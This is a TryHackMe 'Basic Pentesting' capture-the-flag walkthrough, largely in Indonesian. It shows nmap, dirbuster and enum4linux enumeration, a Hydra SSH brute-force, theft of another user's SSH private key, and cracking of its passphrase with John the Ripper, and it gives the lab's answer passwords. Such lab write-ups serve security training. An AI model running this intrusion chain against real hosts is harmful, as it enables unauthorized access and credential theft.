# TryHackMe - Basic Pentesting (IDN)
## Hatami Ra'is Bukhari (Althemier)

Buat folder baru untuk room ini dengan
```bash
mkdir basic-pentest
```

# 1. Deploy machine
Klik start

# 2. Find the services exposed by the machine

## Scan open port dengan Nmap

Buat folder baru untuk menyimpan hasil scan Nmap dengan
```bash
mkdir nmap
```
Lalu jalankan Nmap dengan command:
```bash
nmap -sC -sV -oN nmap/result 10.10.175.26
```

- sV = Scan port untuk mencari tahu versi ke berapa port tersebut, contoh `22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)`
- sC = Menggunakan default NSE script untuk scan
- oN nmap/result = Mengoutputkan hasil scan berupa file ke folder nmap dengan nama result

Untuk lebih lengkap, buka terminal baru dan ketik `man nmap` atau [klik disini](https://www.stationx.net/nmap-cheat-sheet/)

# 3. What is the name of the hidden directory on the web server(enter name without /)?

## Using dirbuster to scan directory

Scan dirbuster use command:
```bash
dirbuster
```

Add "http://10.10.175.26" to target URL

add '/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt' to dirs/file

Leave the rest as default

Check if Dir to start with is "/"

## Found
- /icons/
- /development/
- /development/dev.txt
- /development/j.txt
- /icons/small

From - /development/ found 2 link '/development/dev.txt' and '/development/j.txt' as well as info about server 
Apache/2.4.18 (Ubuntu) Server at 10.10.175.26 Port 80

on /development/dev.txt found theres 2 user as j and k
on /development/j.txt found J has weak password



# 4. User brute-forcing to find the username & password

# 5. What is username
Enumirating with enum4linux

## Scanning with enum4linux
```bash
enum4linux -a 10.10.175.26
```

-a = Do all simple enumeration (or mean default)

## Found
- User Jan
- User Kay

# 6. What is the password?
Using Hydra to bruteforce passowrd with rockyou.txt
```bash
hydra -t 4 -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.175.26
```

Found password 'armando'

ssh to 10.10.175.26 as Jan with
```bash
ssh jan@10.10.175.26
```

login as jan succes

do 
```bash
cd ..
```
and 
```bash
ls
```
You will find theres 2 user which is

```
jan kay
```
cd to kay and do 'ls -a' you will find 
```bash
.	       .bash_logout  .lesshst  .profile			  .viminfo
..	       .bashrc	     .nano     .ssh
.bash_history  .cache	     pass.bak  .sudo_as_admin_successful
```
cd to ssh and you will find
```bash
authorized_keys  id_rsa  id_rsa.pub
```

cat id_rsa will give you text as in id_rsa.txt

Run ssh2john tool to get the hash of the keys
```bash
python ssh2john.py id_rsa.txt > id_rsa.hash
```

Run John The Ripper to crack the passphrase for the account Kay.
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Found the password for Kay : 'beeswax'

Use
```bash
sudo john --show id_rsa.hash 
```
if somehow you not sure


# 7. What service do you use to access the server(answer in abbreviation in all caps)?

SSH

# 8. Enumerate the machine to find any vectors for privilege escalation 
No clue what this mean, so im following [this](https://medium.com/@DanishZia/tryhackme-basic-pentesting-write-up-d6e3d551c0f7) write up for this part and for number 6 and the rest

# 9  What is the name of the other user you found(all lower case)?

kay

# 10. If you have found another user, what can you do with this information? 

# 11. What is the final password you obtain?

If i tried to ssh directly as Kay, I failed. Instead ssh from jan. SSH to Jan as number 6 show, and then

```bash
ssh -i /home/kay/.ssh/id_rsa kay@10.10.175.26
```
You will be prompted with
```bash
Enter passphrase for key '/home/kay/.ssh/id_rsa': 
```
And you type 'beeswax' from John The Ripper earlier

And you're in as Kay

do ls and you'll find 'pass.bak', cat 'pass.bak' adn you find the password which is 
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Done

Thank you.
